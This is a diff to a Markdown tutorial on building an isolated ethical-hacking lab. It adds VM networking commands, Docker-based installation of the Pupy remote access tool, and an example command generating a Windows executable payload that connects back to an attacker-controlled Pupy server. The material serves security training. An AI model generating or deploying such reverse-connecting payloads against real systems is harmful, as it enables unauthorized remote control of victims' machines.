@@ -27,7 +27,56 @@ In a safe ethical hacking environment, you'll want to use **Virtual Machines (VM
   - 🖥️ Windows connected to the internal network
   - 🖥️ Make sure Windows can ping Parrot
 
-#### VirtualBox networking modes
+- 👉 If you can't access Windows network setting GUI, you may open an Administrator PowerShell then access with commands:
+  ```powershell
+  # 1. directly open the Network Connections control panel
+  control ncpa.cpl
+  # OR, 2. open the broader Network and Sharing Center
+  control netcenter
+  # OR, 3. To open the Internet Options control panel:
+  control inetcpl.cpl
+  # OR, 4. open the Network and Sharing Center directly:
+  control.exe /name Microsoft.NetworkAndSharingCenter
+  ```
+- 👉 Configure Parrot network through shell commands:
+  ```bash
+  # 1. identify your network interface name:
+  ip link show # enp0s3, eth0: possible names for physical network interface
+  # ⚠️ change <if> to your network interface name
+  # 2. Set the IP address and subnet mask:
+  sudo ip addr add 192.168.1.100/24 dev <if>
+  # verify
+  ip addr show eth0
+  # 3. Bring the interface up
+  sudo ip link set <if> up
+  # 4. Set the default route (gateway):
+  sudo ip route add default via 192.168.1.1
+  # verify
+  ip route show
+  # 5. Set DNS servers:
+  sudo nano /etc/resolv.conf
+  # add two lines below without #
+  # nameserver 8.8.8.8
+  # nameserver 8.8.4.4
+
+  # verify
+  cat /etc/resolv.conf
+  ```
+  - For persistent configuration, save settings in /etc/netplan/01-netcfg.yaml as below:
+    - Just for reference, not recommended.
+  ```
+  network:
+    ethernets:
+      <if>:
+        addresses:
+          - 192.168.1.100/24
+        gateway4: 192.168.1.1
+        nameservers:
+          addresses: [8.8.8.8, 8.8.4.4]
+  version: 2  
+  ```
+
+#### [VirtualBox networking modes](https://www.virtualbox.org/manual/ch06.html)
 
 | Network Type       | VM to VM Communication | Host to VM Communication | External Network Access | Best Use Case                      |
 |--------------------|-----------------------|--------------------------|-------------------------|-------------------------------------|
@@ -57,11 +106,13 @@ On your attacker machine, if **Pupy** is not preinstalled, you'll install it, th
   - Reconnect to the Internal Network after installation.
 
 #### **Steps to Install Pupy:**
-
+- **Method 1: Local installation**
 1. **Clone the Pupy GitHub Repository:**
    Open a terminal and run the following commands:
    ```bash
    git clone https://github.com/n1nj4sec/pupy.git
+   # or download the archive from: https://github.com/n1nj4sec/pupy/tags
+   # then unzip it
    cd pupy
    ```
 
@@ -87,6 +138,21 @@ On your attacker machine, if **Pupy** is not preinstalled, you'll install it, th
 
    This will start the Pupy interactive shell where you can generate payloads and manage compromised systems.
 
+- **Method 2: Docker (suggested)**
+  - Install docker
+  - [Pull then use Pupy docker image](https://github.com/n1nj4sec/pupy/tree/unstable)
+
+    ```bash
+    # 1. Pull Image
+    docker image pull cyb3rward0g/docker-pupy:f8c829dd66449888ec3f4c7d086e607060bca892
+    # 2. Tag image
+    docker tag cyb3rward0g/docker-pupy:f8c829dd66449888ec3f4c7d086e607060bca892 docker-pupy
+    # 3. Run Image 
+    docker run --rm -it -p 1234:1234 docker-pupy python pupysh.py
+    # OR, mount a host folder where you have all your payloads
+    docker run --rm -it -p 1234:1234 -v "/opt/payloads:/tmp/payloads" docker-pupy python pupysh.py
+    ```
+
 - 💻 Pupy interactive shell
 
 ---
@@ -103,6 +169,7 @@ After setting up the **Pupy server**, you will need to generate a payload that c
    Generating a **Windows executable payload**:
    ```bash
    gen -f exe_x64 connect --host <attacker_ip>:<port>
+   # example: gen -f exe_x64 connect --host 192.168.1.100:8888
    ```
 
    This will create a payload that connects back to your **Pupy** server at `<attacker_ip>:<port>`.
@@ -200,7 +267,7 @@ Once your testing is complete:
 
 
 # References
-- [Puppy](https://github.com/n1nj4sec/pupy)
+- [Pupy](https://github.com/n1nj4sec/pupy)
 - [PracticalMalwareAnalysis-Labs](https://github.com/mikesiko/PracticalMalwareAnalysis-Labs)
   - [Book](https://nostarch.com/malware)
   - [Class 2019](https://samsclass.info/126/126_F19.shtml)
